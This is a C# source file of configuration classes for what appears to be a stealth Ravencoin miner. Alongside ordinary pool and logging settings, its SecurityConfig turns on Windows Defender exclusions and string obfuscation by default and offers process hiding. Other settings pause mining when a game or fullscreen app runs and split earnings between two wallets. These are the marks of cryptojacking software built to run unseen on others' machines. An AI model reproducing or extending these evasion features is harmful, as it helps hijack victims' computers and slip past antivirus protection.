using System;
using System.ComponentModel.DataAnnotations;
using System.IO;
using Newtonsoft.Json;

namespace RvnMiner.Models
{
    public class MiningConfig
    {
        [JsonProperty("PrimaryAddress")]
        [Required]
        public string PrimaryAddress { get; set; } = "";

        [JsonProperty("SecondaryAddress")]
        [Required]
        public string SecondaryAddress { get; set; } = "";

        [JsonProperty("PrimaryPercentage")]
        [Range(0, 100)]
        public int PrimaryPercentage { get; set; } = 70;

        [JsonProperty("SecondaryPercentage")]
        [Range(0, 100)]
        public int SecondaryPercentage { get; set; } = 30;

        [JsonProperty("PoolUrl")]
        public string PoolUrl { get; set; } = "stratum+tcp://rvn.2miners.com:6060";

        [JsonProperty("WorkerName")]
        public string WorkerName { get; set; } = "RvnMiner-Worker";

        [JsonProperty("Password")]
        public string Password { get; set; } = "x";
    }

    public class PerformanceConfig
    {
        [JsonProperty("AutoPauseOnFullscreen")]
        public bool AutoPauseOnFullscreen { get; set; } = true;

        [JsonProperty("PauseOnGameDetected")]
        public bool PauseOnGameDetected { get; set; } = true;

        [JsonProperty("MaxGpuUsage")]
        [Range(1, 100)]
        public int MaxGpuUsage { get; set; } = 95;

        [JsonProperty("MaxCpuUsage")]
        [Range(1, 100)]
        public int MaxCpuUsage { get; set; } = 80;

        [JsonProperty("Intensity")]
        public string Intensity { get; set; } = "auto";

        [JsonProperty("Threads")]
        public int Threads { get; set; } = 0;
    }

    public class SecurityConfig
    {
        [JsonProperty("AddToDefenderExclusions")]
        public bool AddToDefenderExclusions { get; set; } = true;

        [JsonProperty("HideProcess")]
        public bool HideProcess { get; set; } = false;

        [JsonProperty("ObfuscateStrings")]
        public bool ObfuscateStrings { get; set; } = true;
    }

    public class LoggingConfig
    {
        [JsonProperty("EnableLogging")]
        public bool EnableLogging { get; set; } = true;

        [JsonProperty("LogLevel")]
        public string LogLevel { get; set; } = "Info";

        [JsonProperty("LogFilePath")]
        public string LogFilePath { get; set; } = "rvn-miner.log";

        [JsonProperty("MaxLogSizeMB")]
        [Range(1, 1000)]
        public int MaxLogSizeMB { get; set; } = 10;

        [JsonProperty("ConsoleOutput")]
        public bool ConsoleOutput { get; set; } = true;
    }

    public class AdvancedConfig
    {
        [JsonProperty("RetryFailedShares")]
        public bool RetryFailedShares { get; set; } = true;

        [JsonProperty("MaxReconnectAttempts")]
        [Range(1, 20)]
        public int MaxReconnectAttempts { get; set; } = 5;

        [JsonProperty("ReconnectDelaySeconds")]
        [Range(1, 300)]
        public int ReconnectDelaySeconds { get; set; } = 10;

        [JsonProperty("HashrateReportIntervalSeconds")]
        [Range(10, 3600)]
        public int HashrateReportIntervalSeconds { get; set; } = 30;

        [JsonProperty("TemperatureMonitoring")]
        public bool TemperatureMonitoring { get; set; } = true;

        [JsonProperty("MaxGPUTemperature")]
        [Range(50, 110)]
        public int MaxGPUTemperature { get; set; } = 75;
    }

    public class AppConfig
    {
        [JsonProperty("Mining")]
        public MiningConfig Mining { get; set; } = new MiningConfig();

        [JsonProperty("Performance")]
        public PerformanceConfig Performance { get; set; } = new PerformanceConfig();

        [JsonProperty("Security")]
        public SecurityConfig Security { get; set; } = new SecurityConfig();

        [JsonProperty("Logging")]
        public LoggingConfig Logging { get; set; } = new LoggingConfig();

        [JsonProperty("Advanced")]
        public AdvancedConfig Advanced { get; set; } = new AdvancedConfig();

        public static AppConfig Load(string configPath = "Config.json")
        {
            try
            {
                if (!File.Exists(configPath))
                {
                    var defaultConfig = new AppConfig();
                    defaultConfig.Save(configPath);
                    return defaultConfig;
                }

                string json = File.ReadAllText(configPath);
                return JsonConvert.DeserializeObject<AppConfig>(json) ?? new AppConfig();
            }
            catch (Exception)
            {
                return new AppConfig();
            }
        }

        public void Save(string configPath = "Config.json")
        {
            try
            {
                string json = JsonConvert.SerializeObject(this, Formatting.Indented);
                File.WriteAllText(configPath, json);
            }
            catch (Exception)
            {
                // Игнорируем ошибки сохранения
            }
        }
    }
}